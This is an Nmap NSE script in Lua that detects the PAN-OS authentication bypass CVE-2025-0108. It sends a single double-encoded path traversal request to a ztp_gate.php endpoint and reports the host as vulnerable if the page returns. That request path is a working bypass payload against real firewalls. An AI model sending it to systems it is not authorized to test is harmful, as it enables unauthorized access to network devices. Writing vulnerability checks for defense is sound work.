local http = require "http"
local stdnse = require "stdnse"
local shortport = require "shortport"
local table = require "table"
local string = require "string"
local nmap = require "nmap"
local io = require "io"

description = [[
This NSE script checks for the presence of an authentication bypass vulnerability in Palo Alto Networks' PAN-OS (CVE-2025-0108). The vulnerability allows unauthorized access via a crafted path traversal request.
]]

---
-- @usage
-- nmap --script paloaltonetworks-panos-cve-2025-0108 -p <port> <host>
-- nmap --script paloaltonetworks-panos-cve-2025-0108 -p <port> -iL <list_host>
---

categories = {"discovery", "vuln"}
author = "Abdulla Abdullayev (@abuyv)"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

portrule = shortport.ssl

action = function(host, port)
  local result = {}
  local response

  response = http.get(host, port, "/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css")
  if response.status == 200 and string.match(response.body, "Zero Touch Provisioning") then
    table.insert(result, "Target: cpe:2.3:o:paloaltonetworks:pan-os:-:-:-:-:-:-:-:-")
    table.insert(result, "Status: Host appears to be vulnerable to CVE-2025-0108")
    table.insert(result, "Reference: https://security.paloaltonetworks.com/CVE-2025-0108")
  else
    table.insert(result, "Target: cpe:2.3:o:paloaltonetworks:pan-os:-:-:-:-:-:-:-:-")
    table.insert(result, "Status: Host does not appear to be vulnerable to CVE-2025-0108")
  end

  return stdnse.format_output(true, result)
end
